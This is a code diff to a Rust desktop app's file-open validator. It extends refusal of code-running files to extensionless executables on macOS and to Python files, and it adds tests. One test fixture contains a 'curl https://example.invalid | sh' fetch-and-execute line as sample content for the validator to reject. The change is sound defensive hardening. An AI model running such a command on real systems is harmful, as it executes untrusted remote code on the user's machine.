@@ -331,24 +331,32 @@ fn validate_open_local_file_path(path: &str) -> Result<PathBuf, AppCommandError>
 /// it names: a runnable type ([`RUNNABLE_EXTENSIONS`]), and on Windows also a
 /// type the shell itself flags as dangerous or whose registered handler is a
 /// script host (`.py` → `py.exe`, …). On Unix, an executable that really is a
-/// program or script (`#!`, ELF, Mach-O) — `open` runs an extensionless one in
-/// Terminal — but not the execute bit alone, which exFAT/FAT volumes set on
-/// every file.
+/// program or script (`#!`, ELF, Mach-O) — but not the execute bit alone,
+/// which exFAT/FAT volumes set on every file. On macOS, also any executable
+/// with no extension: Finder's "open" runs it in Terminal, whose shell runs a
+/// file with no `#!` line as a script all the same.
 #[cfg(any(test, feature = "tauri-runtime"))]
 fn runs_code_when_opened(path: &Path, meta: &std::fs::Metadata) -> bool {
+    let canonical = std::fs::canonicalize(path).ok();
+    let names = || std::iter::once(path).chain(canonical.as_deref());
     #[cfg(unix)]
     {
         use std::os::unix::fs::PermissionsExt;
-        if meta.permissions().mode() & 0o111 != 0 && starts_like_a_program(path) {
-            return true;
+        if meta.permissions().mode() & 0o111 != 0 {
+            if starts_like_a_program(path) {
+                return true;
+            }
+            // `NOTES.` has an empty extension, and is as extensionless to
+            // Finder.
+            #[cfg(target_os = "macos")]
+            if names().any(|name| name.extension().is_none_or(|ext| ext.is_empty())) {
+                return true;
+            }
         }
     }
     #[cfg(not(unix))]
     let _ = meta;
-    let canonical = std::fs::canonicalize(path).ok();
-    std::iter::once(path)
-        .chain(canonical.as_deref())
-        .any(extension_runs_code)
+    names().any(extension_runs_code)
 }
 
 /// A shebang or an executable image header (ELF; Mach-O thin, either byte
@@ -574,6 +582,12 @@ const RUNNABLE_EXTENSIONS: &[&str] = &[
     "mdimporter",
     "kext",
     "osax",
+    // Python Launcher (python.org's installer makes it the default app) runs
+    // them in Terminal.
+    "py",
+    "pyw",
+    "pyc",
+    "pyo",
     // Windows programs: a registered Wine / CrossOver runs them on "open",
     // execute bit or not.
     "exe",
@@ -1111,6 +1125,58 @@ mod tests {
         let err = validate_open_local_file_path(binary.to_str().expect("utf8"))
             .expect_err("an executable image");
         assert!(err.message.contains("can run code"), "{err:?}");
+    }
+
+    /// Finder runs an extensionless executable in Terminal, `#!` or not —
+    /// through a link to one too; an extensionless file that is not
+    /// executable is a document.
+    #[cfg(target_os = "macos")]
+    #[test]
+    fn local_file_refuses_an_extensionless_executable_on_macos() {
+        use std::os::unix::fs::PermissionsExt;
+        let dir = tempfile::tempdir().expect("tempdir");
+
+        let script = dir.path().join("NOTES");
+        fs::write(&script, "curl https://example.invalid | sh\n").expect("write file");
+        fs::set_permissions(&script, fs::Permissions::from_mode(0o755)).expect("chmod");
+        let err = validate_open_local_file_path(script.to_str().expect("utf8"))
+            .expect_err("an extensionless executable");
+        assert!(err.message.contains("can run code"), "{err:?}");
+
+        let link = dir.path().join("notes.md");
+        std::os::unix::fs::symlink(&script, &link).expect("symlink");
+        let err = validate_open_local_file_path(link.to_str().expect("utf8"))
+            .expect_err("a link to an extensionless executable");
+        assert!(err.message.contains("can run code"), "{err:?}");
+
+        let dotted = dir.path().join("NOTES.");
+        fs::write(&dotted, "echo hi\n").expect("write file");
+        fs::set_permissions(&dotted, fs::Permissions::from_mode(0o755)).expect("chmod");
+        validate_open_local_file_path(dotted.to_str().expect("utf8"))
+            .expect_err("an empty extension is none");
+        let dotted_link = dir.path().join("dotted.md");
+        std::os::unix::fs::symlink(&dotted, &dotted_link).expect("symlink");
+        validate_open_local_file_path(dotted_link.to_str().expect("utf8"))
+            .expect_err("a link to an empty extension");
+
+        let dotfile = dir.path().join(".setup");
+        fs::write(&dotfile, "echo hi\n").expect("write file");
+        fs::set_permissions(&dotfile, fs::Permissions::from_mode(0o700)).expect("chmod");
+        validate_open_local_file_path(dotfile.to_str().expect("utf8"))
+            .expect_err("an executable dotfile has no extension");
+
+        let readme = dir.path().join("README");
+        fs::write(&readme, "plain text\n").expect("write file");
+        fs::set_permissions(&readme, fs::Permissions::from_mode(0o644)).expect("chmod");
+        validate_open_local_file_path(readme.to_str().expect("utf8")).expect("a document");
+
+        for name in ["tool.py", "tool.PYW"] {
+            let file = dir.path().join(name);
+            fs::write(&file, "print('hi')\n").expect("write file");
+            let err = validate_open_local_file_path(file.to_str().expect("utf8"))
+                .expect_err("Python Launcher runs it");
+            assert!(err.message.contains("can run code"), "{name}: {err:?}");
+        }
     }
 
     #[test]
